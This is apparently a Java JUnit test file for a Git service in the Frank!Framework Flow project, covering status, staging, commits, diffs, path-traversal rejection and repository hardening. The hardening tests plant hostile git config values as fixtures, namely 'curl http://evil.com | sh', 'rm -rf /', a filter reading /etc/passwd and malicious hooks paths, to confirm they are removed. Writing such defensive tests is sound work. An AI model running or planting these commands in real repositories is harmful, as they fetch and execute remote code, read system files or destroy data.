package org.frankframework.flow.git;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.eclipse.jgit.api.Git;
import org.eclipse.jgit.lib.StoredConfig;
import org.frankframework.flow.filesystem.FileSystemStorage;
import org.frankframework.flow.project.Project;
import org.frankframework.flow.project.ProjectNotFoundException;
import org.frankframework.flow.project.ProjectService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

@ExtendWith(MockitoExtension.class)
public class GitServiceTest {

    private GitService gitService;

    @Mock
    private ProjectService projectService;

    @Mock
    private FileSystemStorage fileSystemStorage;

    @TempDir
    Path tempDir;

    private Git git;

    private Project mockProject;

    @BeforeEach
    public void setUp() throws Exception {
        gitService = new GitService(projectService, fileSystemStorage);

        git = Git.init().setDirectory(tempDir.toFile()).call();

        git.getRepository().getConfig().setBoolean("commit", null, "gpgSign", false);
        git.getRepository().getConfig().save();

        Path readmeFile = tempDir.resolve("README.md");
        Files.writeString(readmeFile, "# Test Project\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();
        git.commit().setMessage("Initial commit").call();

        mockProject = mock(Project.class);
    }

    private void stubProject() throws Exception {
        when(mockProject.getRootPath()).thenReturn(tempDir.toString());
        when(projectService.getProject("test-project")).thenReturn(mockProject);
        when(fileSystemStorage.toAbsolutePath(tempDir.toString())).thenReturn(tempDir);
    }

    @Test
    public void isGitRepositoryReturnsTrueForGitRepo() throws Exception {
        stubProject();
        assertTrue(gitService.isGitRepository("test-project"));
    }

    @Test
    public void isGitRepositoryReturnsFalseForNonGitDir() throws Exception {
        Path nonGitDir = tempDir.resolve("not-git");
        Files.createDirectories(nonGitDir);

        Project project = mock(Project.class);
        when(project.getRootPath()).thenReturn(nonGitDir.toString());
        when(projectService.getProject("not-git")).thenReturn(project);
        when(fileSystemStorage.toAbsolutePath(nonGitDir.toString())).thenReturn(nonGitDir);

        assertFalse(gitService.isGitRepository("not-git"));
    }

    @Test
    public void getStatusReturnsCorrectBranch() throws Exception {
        stubProject();
        GitStatusDTO status = gitService.getStatus("test-project");

        assertNotNull(status);
        assertNotNull(status.branch());
    }

    @Test
    public void getStatusShowsModifiedFiles() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);

        GitStatusDTO status = gitService.getStatus("test-project");

        assertTrue(status.modified().contains("README.md"));
    }

    @Test
    public void getStatusShowsUntrackedFiles() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("new-file.txt"), "new content", StandardCharsets.UTF_8);

        GitStatusDTO status = gitService.getStatus("test-project");

        assertTrue(status.untracked().contains("new-file.txt"));
    }

    @Test
    public void getStatusShowsStagedFilesAfterAdd() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Staged\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();

        GitStatusDTO status = gitService.getStatus("test-project");

        assertTrue(status.staged().contains("README.md"));
        assertFalse(status.modified().contains("README.md"));
    }

    @Test
    public void getStatusShowsDeletedFilesAsMissing() throws Exception {
        stubProject();
        Files.delete(tempDir.resolve("README.md"));

        GitStatusDTO status = gitService.getStatus("test-project");

        assertTrue(status.modified().contains("README.md"));
    }

    @Test
    public void getStatusShowsEmptyListsForCleanRepo() throws Exception {
        stubProject();
        GitStatusDTO status = gitService.getStatus("test-project");

        assertTrue(status.staged().isEmpty());
        assertTrue(status.modified().isEmpty());
        assertTrue(status.untracked().isEmpty());
        assertTrue(status.conflicting().isEmpty());
    }

    @Test
    public void getStatusReturnsHasRemoteFalseForLocalOnly() throws Exception {
        stubProject();
        GitStatusDTO status = gitService.getStatus("test-project");

        assertFalse(status.hasRemote());
    }

    @Test
    public void getStatusAheadAndBehindAreZeroWithNoRemote() throws Exception {
        stubProject();
        GitStatusDTO status = gitService.getStatus("test-project");

        assertEquals(0, status.ahead());
        assertEquals(0, status.behind());
    }

    @Test
    public void stageFileAddsToStagedChanges() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);

        gitService.stageFile("test-project", "README.md");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("README.md"));
        assertFalse(status.modified().contains("README.md"));
    }

    @Test
    public void stageFileHandlesNewUntrackedFile() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("brand-new.txt"), "new file content", StandardCharsets.UTF_8);

        gitService.stageFile("test-project", "brand-new.txt");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("brand-new.txt"));
    }

    @Test
    public void stageFileHandlesDeletedFile() throws Exception {
        stubProject();
        Files.delete(tempDir.resolve("README.md"));

        gitService.stageFile("test-project", "README.md");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("README.md"));
    }

    @Test
    public void stageFileRejectsPathTraversal() throws Exception {
        stubProject();
        assertThrows(SecurityException.class, () -> gitService.stageFile("test-project", "../../../etc/passwd"));
    }

    @Test
    public void stageFileRejectsAbsolutePath() throws Exception {
        stubProject();
        assertThrows(SecurityException.class, () -> gitService.stageFile("test-project", "/etc/passwd"));
    }

    @Test
    public void unstageFileRemovesFromStagedChanges() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();

        gitService.unstageFile("test-project", "README.md");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertFalse(status.staged().contains("README.md"));
        assertTrue(status.modified().contains("README.md"));
    }

    @Test
    public void unstageNewFileMovesToUntracked() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("new.txt"), "content", StandardCharsets.UTF_8);
        git.add().addFilepattern("new.txt").call();

        gitService.unstageFile("test-project", "new.txt");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertFalse(status.staged().contains("new.txt"));
        assertTrue(status.untracked().contains("new.txt"));
    }

    @Test
    public void commitCreatesNewCommit() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();

        GitCommitResultDTO result = gitService.commit("test-project", "Test commit message");

        assertNotNull(result.commitId());
        assertEquals("Test commit message", result.message());
        assertNotNull(result.author());
        assertTrue(result.timestamp() > 0);
    }

    @Test
    public void commitIdIsValidSha() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();

        GitCommitResultDTO result = gitService.commit("test-project", "Test");

        assertEquals(40, result.commitId().length());
        assertTrue(result.commitId().matches("[0-9a-f]+"));
    }

    @Test
    public void commitLeavesCleanStatus() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();

        gitService.commit("test-project", "Commit it");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().isEmpty());
        assertTrue(status.modified().isEmpty());
    }

    @Test
    public void getLogReturnsCommits() throws Exception {
        stubProject();
        List<GitLogEntryDTO> log = gitService.getLog("test-project", 10);

        assertFalse(log.isEmpty());
        assertEquals("Initial commit", log.getFirst().message());
        assertNotNull(log.getFirst().shortId());
    }

    @Test
    public void getLogReturnsMultipleCommits() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# v2\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();
        git.commit().setMessage("Second commit").call();

        Files.writeString(tempDir.resolve("README.md"), "# v3\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();
        git.commit().setMessage("Third commit").call();

        List<GitLogEntryDTO> log = gitService.getLog("test-project", 10);

        assertEquals(3, log.size());
        assertEquals("Third commit", log.get(0).message());
        assertEquals("Second commit", log.get(1).message());
        assertEquals("Initial commit", log.get(2).message());
    }

    @Test
    public void getLogRespectsCountLimit() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# v2\n", StandardCharsets.UTF_8);
        git.add().addFilepattern("README.md").call();
        git.commit().setMessage("Second commit").call();

        List<GitLogEntryDTO> log = gitService.getLog("test-project", 1);

        assertEquals(1, log.size());
        assertEquals("Second commit", log.getFirst().message());
    }

    @Test
    public void getLogEntryHasValidFields() throws Exception {
        stubProject();
        List<GitLogEntryDTO> log = gitService.getLog("test-project", 1);

        GitLogEntryDTO entry = log.getFirst();
        assertEquals(40, entry.commitId().length());
        assertEquals(7, entry.shortId().length());
        assertNotNull(entry.author());
        assertTrue(entry.timestamp() > 0);
    }

    @Test
    public void getFileDiffReturnsOldAndNewContent() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified Content\n", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");

        assertEquals("README.md", diff.filePath());
        assertEquals("# Test Project\n", diff.oldContent());
        assertEquals("# Modified Content\n", diff.newContent());
    }

    @Test
    public void getFileDiffReturnsHunks() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified Content\n", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");

        assertFalse(diff.hunks().isEmpty());
        GitHunkDTO hunk = diff.hunks().getFirst();
        assertNotNull(hunk.header());
        assertNotNull(hunk.content());
        assertTrue(hunk.content().contains("-# Test Project"));
        assertTrue(hunk.content().contains("+# Modified Content"));
    }

    @Test
    public void getFileDiffForNewFileReturnsEmptyOldContent() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("new-file.txt"), "brand new\n", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "new-file.txt");

        assertEquals("", diff.oldContent());
        assertEquals("brand new\n", diff.newContent());
    }

    @Test
    public void getFileDiffForDeletedFileReturnsEmptyNewContent() throws Exception {
        stubProject();
        Files.delete(tempDir.resolve("README.md"));

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");

        assertEquals("# Test Project\n", diff.oldContent());
        assertEquals("", diff.newContent());
    }

    @Test
    public void getFileDiffForUnchangedFileReturnsNoHunks() throws Exception {
        stubProject();
        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");

        assertTrue(diff.hunks().isEmpty());
        assertEquals(diff.oldContent(), diff.newContent());
    }

    @Test
    public void getFileDiffHandlesMultipleHunks() throws Exception {
        stubProject();
        String original = "line1\nline2\nline3\nline4\nline5\nline6\nline7\nline8\nline9\nline10\n";
        Files.writeString(tempDir.resolve("multi.txt"), original, StandardCharsets.UTF_8);
        git.add().addFilepattern("multi.txt").call();
        git.commit().setMessage("Add multi.txt").call();

        String modified = "line1-changed\nline2\nline3\nline4\nline5\nline6\nline7\nline8\nline9\nline10-changed\n";
        Files.writeString(tempDir.resolve("multi.txt"), modified, StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "multi.txt");

        assertTrue(diff.hunks().size() >= 2);
    }

    @Test
    public void getFileDiffNormalizesCRLF() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("README.md"), "# Modified\r\nWith CRLF\r\n", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");

        assertFalse(diff.newContent().contains("\r"));
    }

    @Test
    public void getFileDiffRejectsPathTraversal() throws Exception {
        stubProject();
        assertThrows(SecurityException.class, () -> gitService.getFileDiff("test-project", "../../etc/passwd"));
    }

    @Test
    public void stageHunksPartiallyStagesFile() throws Exception {
        stubProject();
        String original = "line1\nline2\nline3\nline4\nline5\n";
        Files.writeString(tempDir.resolve("multi.txt"), original, StandardCharsets.UTF_8);
        git.add().addFilepattern("multi.txt").call();
        git.commit().setMessage("Add multi.txt").call();

        String modified = "line1-changed\nline2\nline3\nline4\nline5-changed\n";
        Files.writeString(tempDir.resolve("multi.txt"), modified, StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "multi.txt");
        assertFalse(diff.hunks().isEmpty());

        gitService.stageHunks("test-project", "multi.txt", List.of(0));

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("multi.txt"));
    }

    @Test
    public void stageHunksAllHunksEqualsFullStage() throws Exception {
        stubProject();
        String original = "aaa\nbbb\nccc\n";
        Files.writeString(tempDir.resolve("full.txt"), original, StandardCharsets.UTF_8);
        git.add().addFilepattern("full.txt").call();
        git.commit().setMessage("Add full.txt").call();

        String modified = "xxx\nbbb\nyyy\n";
        Files.writeString(tempDir.resolve("full.txt"), modified, StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "full.txt");
        List<Integer> allIndices = diff.hunks().stream().map(GitHunkDTO::index).toList();

        gitService.stageHunks("test-project", "full.txt", allIndices);

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("full.txt"));
    }

    @Test
    public void notAGitRepositoryThrowsException() throws Exception {
        Path nonGitDir = tempDir.resolve("not-git");
        Files.createDirectories(nonGitDir);

        Project project = mock(Project.class);
        when(project.getRootPath()).thenReturn(nonGitDir.toString());
        when(projectService.getProject("not-git")).thenReturn(project);
        when(fileSystemStorage.toAbsolutePath(nonGitDir.toString())).thenReturn(nonGitDir);

        assertThrows(NotAGitRepositoryException.class, () -> gitService.getStatus("not-git"));
    }

    @Test
    public void notAGitRepositoryThrowsForCommit() throws Exception {
        Path nonGitDir = tempDir.resolve("not-git2");
        Files.createDirectories(nonGitDir);

        Project project = mock(Project.class);
        when(project.getRootPath()).thenReturn(nonGitDir.toString());
        when(projectService.getProject("not-git2")).thenReturn(project);
        when(fileSystemStorage.toAbsolutePath(nonGitDir.toString())).thenReturn(nonGitDir);

        assertThrows(NotAGitRepositoryException.class, () -> gitService.commit("not-git2", "test"));
    }

    @Test
    public void notAGitRepositoryThrowsForStageFile() throws Exception {
        Path nonGitDir = tempDir.resolve("not-git3");
        Files.createDirectories(nonGitDir);

        Project project = mock(Project.class);
        when(project.getRootPath()).thenReturn(nonGitDir.toString());
        when(projectService.getProject("not-git3")).thenReturn(project);
        when(fileSystemStorage.toAbsolutePath(nonGitDir.toString())).thenReturn(nonGitDir);

        assertThrows(NotAGitRepositoryException.class, () -> gitService.stageFile("not-git3", "file.txt"));
    }

    @Test
    public void projectNotFoundThrowsForStatus() throws Exception {
        when(projectService.getProject("nonexistent")).thenThrow(new ProjectNotFoundException("nonexistent"));

        assertThrows(ProjectNotFoundException.class, () -> gitService.getStatus("nonexistent"));
    }

    @Test
    public void projectNotFoundThrowsForIsGitRepository() throws Exception {
        when(projectService.getProject("nonexistent")).thenThrow(new ProjectNotFoundException("nonexistent"));

        assertThrows(ProjectNotFoundException.class, () -> gitService.isGitRepository("nonexistent"));
    }

    @Test
    public void stageFileRejectsPathWithDotDot() throws Exception {
        stubProject();
        assertThrows(SecurityException.class, () -> gitService.stageFile("test-project", "../outside"));
    }

    @Test
    public void getFileDiffRejectsPathWithDotDot() throws Exception {
        stubProject();
        assertThrows(SecurityException.class, () -> gitService.getFileDiff("test-project", "../outside"));
    }

    @Test
    public void stageFileAcceptsSubdirectoryPath() throws Exception {
        stubProject();
        Path subDir = tempDir.resolve("src");
        Files.createDirectories(subDir);
        Files.writeString(subDir.resolve("App.java"), "class App {}", StandardCharsets.UTF_8);

        gitService.stageFile("test-project", "src/App.java");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("src/App.java"));
    }

    @Test
    public void getFileDiffAcceptsSubdirectoryPath() throws Exception {
        stubProject();
        Path subDir = tempDir.resolve("src");
        Files.createDirectories(subDir);
        Files.writeString(subDir.resolve("App.java"), "class App {}", StandardCharsets.UTF_8);
        git.add().addFilepattern("src/App.java").call();
        git.commit().setMessage("Add App.java").call();

        Files.writeString(subDir.resolve("App.java"), "class App { int x; }", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "src/App.java");

        assertNotNull(diff);
        assertEquals("src/App.java", diff.filePath());
    }

    @Test
    public void pushThrowsGitOperationExceptionForNoRemote() throws Exception {
        stubProject();
        assertThrows(GitOperationException.class, () -> gitService.push("test-project", null));
    }

    @Test
    public void pullThrowsGitOperationExceptionForNoRemote() throws Exception {
        stubProject();
        assertThrows(GitOperationException.class, () -> gitService.pull("test-project", null));
    }

    @Test
    public void pushErrorMessageMentionsPATOnCloud() throws Exception {
        stubProject();
        when(fileSystemStorage.isLocalEnvironment()).thenReturn(false);

        GitOperationException ex =
                assertThrows(GitOperationException.class, () -> gitService.push("test-project", null));

        assertTrue(ex.getMessage().contains("PAT"));
    }

    @Test
    public void pullErrorMessageMentionsPATOnCloud() throws Exception {
        stubProject();
        when(fileSystemStorage.isLocalEnvironment()).thenReturn(false);

        GitOperationException ex =
                assertThrows(GitOperationException.class, () -> gitService.pull("test-project", null));

        assertTrue(ex.getMessage().contains("PAT"));
    }

    @Test
    public void pushErrorMessageIsGenericOnLocal() throws Exception {
        stubProject();
        when(fileSystemStorage.isLocalEnvironment()).thenReturn(true);

        GitOperationException ex =
                assertThrows(GitOperationException.class, () -> gitService.push("test-project", null));

        assertFalse(ex.getMessage().contains("PAT"));
        assertTrue(ex.getMessage().contains("Failed to push"));
    }

    @Test
    public void hardenSetsHooksPathToDevNull() throws Exception {
        GitService.hardenRepository(git.getRepository());

        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
    }

    @Test
    public void hardenOverridesExistingHooksPath() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("core", null, "hooksPath", "/malicious/hooks");
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
    }

    @Test
    public void hardenOverridesHooksPathPointingInsideWorkingTree() throws Exception {
        Path evilHooks = tempDir.resolve(".my-hooks");
        Files.createDirectories(evilHooks);
        Files.writeString(evilHooks.resolve("pre-commit"), "#!/bin/sh\necho pwned", StandardCharsets.UTF_8);

        StoredConfig config = git.getRepository().getConfig();
        config.setString("core", null, "hooksPath", evilHooks.toString());
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertEquals("/dev/null", git.getRepository().getConfig().getString("core", null, "hooksPath"));
    }

    @Test
    public void hardenDisablesSymlinks() throws Exception {
        GitService.hardenRepository(git.getRepository());

        assertFalse(git.getRepository().getConfig().getBoolean("core", null, "symlinks", true));
    }

    @Test
    public void hardenOverridesSymlinksEnabled() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setBoolean("core", null, "symlinks", true);
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertFalse(git.getRepository().getConfig().getBoolean("core", null, "symlinks", true));
    }

    @Test
    public void hardenRemovesSingleFilterSection() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("filter", "evil", "clean", "/bin/sh -c 'cat /etc/passwd'");
        config.setString("filter", "evil", "smudge", "/bin/sh -c 'cat /etc/passwd'");
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertNull(git.getRepository().getConfig().getString("filter", "evil", "clean"));
        assertNull(git.getRepository().getConfig().getString("filter", "evil", "smudge"));
    }

    @Test
    public void hardenRemovesMultipleFilterSections() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("filter", "malicious", "clean", "/tmp/evil.sh");
        config.setString("filter", "another", "smudge", "curl http://evil.com | sh");
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertNull(git.getRepository().getConfig().getString("filter", "malicious", "clean"));
        assertNull(git.getRepository().getConfig().getString("filter", "another", "smudge"));
    }

    @Test
    public void hardenHandlesNoFilterSectionsGracefully() throws Exception {
        assertDoesNotThrow(() -> GitService.hardenRepository(git.getRepository()));
    }

    @Test
    public void hardenRemovesFilterWithSpecialCharsInName() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("filter", "my-filter.v2", "clean", "/evil/script");
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertNull(git.getRepository().getConfig().getString("filter", "my-filter.v2", "clean"));
    }

    @Test
    public void hardenRemovesFiltersReAddedBetweenCalls() throws Exception {
        GitService.hardenRepository(git.getRepository());

        StoredConfig config = git.getRepository().getConfig();
        config.setString("filter", "injected", "clean", "/tmp/steal-data.sh");
        config.save();

        GitService.hardenRepository(git.getRepository());

        assertNull(git.getRepository().getConfig().getString("filter", "injected", "clean"));
    }

    @Test
    public void hardenChangesPersistAfterReopening() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("core", null, "hooksPath", "/evil/hooks");
        config.setBoolean("core", null, "symlinks", true);
        config.setString("filter", "bad", "clean", "rm -rf /");
        config.save();

        GitService.hardenRepository(git.getRepository());

        try (Git reopened = Git.open(tempDir.toFile())) {
            StoredConfig fresh = reopened.getRepository().getConfig();
            assertEquals("/dev/null", fresh.getString("core", null, "hooksPath"));
            assertFalse(fresh.getBoolean("core", null, "symlinks", true));
            assertNull(fresh.getString("filter", "bad", "clean"));
        }
    }

    @Test
    public void hardenIsIdempotent() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("filter", "custom", "clean", "custom-filter clean");
        config.save();

        GitService.hardenRepository(git.getRepository());
        GitService.hardenRepository(git.getRepository());

        StoredConfig result = git.getRepository().getConfig();
        assertEquals("/dev/null", result.getString("core", null, "hooksPath"));
        assertFalse(result.getBoolean("core", null, "symlinks", true));
        assertNull(result.getString("filter", "custom", "clean"));
    }

    @Test
    public void hardenDoesNotRemoveUnrelatedConfig() throws Exception {
        StoredConfig config = git.getRepository().getConfig();
        config.setString("user", null, "name", "Test User");
        config.setString("user", null, "email", "test@example.com");
        config.setString("remote", "origin", "url", "https://example.com/repo.git");
        config.save();

        GitService.hardenRepository(git.getRepository());

        StoredConfig result = git.getRepository().getConfig();
        assertEquals("Test User", result.getString("user", null, "name"));
        assertEquals("test@example.com", result.getString("user", null, "email"));
        assertEquals("https://example.com/repo.git", result.getString("remote", "origin", "url"));
    }

    @Test
    public void hardenPreservesGpgSignFalse() throws Exception {
        GitService.hardenRepository(git.getRepository());

        assertFalse(git.getRepository().getConfig().getBoolean("commit", null, "gpgSign", true));
    }

    @Test
    public void commitWorksAfterHardening() throws Exception {
        stubProject();
        Files.writeString(tempDir.resolve("new.txt"), "content", StandardCharsets.UTF_8);
        git.add().addFilepattern("new.txt").call();

        GitCommitResultDTO result = gitService.commit("test-project", "Post-harden commit");

        assertEquals("Post-harden commit", result.message());
    }

    @Test
    public void statusWorksAfterHardening() throws Exception {
        stubProject();
        GitService.hardenRepository(git.getRepository());

        Files.writeString(tempDir.resolve("new.txt"), "x", StandardCharsets.UTF_8);

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.untracked().contains("new.txt"));
    }

    @Test
    public void stageFileWorksAfterHardening() throws Exception {
        stubProject();
        GitService.hardenRepository(git.getRepository());

        Files.writeString(tempDir.resolve("staged.txt"), "data", StandardCharsets.UTF_8);
        gitService.stageFile("test-project", "staged.txt");

        GitStatusDTO status = gitService.getStatus("test-project");
        assertTrue(status.staged().contains("staged.txt"));
    }

    @Test
    public void diffWorksAfterHardening() throws Exception {
        stubProject();
        GitService.hardenRepository(git.getRepository());

        Files.writeString(tempDir.resolve("README.md"), "# Changed\n", StandardCharsets.UTF_8);

        GitFileDiffDTO diff = gitService.getFileDiff("test-project", "README.md");
        assertFalse(diff.hunks().isEmpty());
    }
}
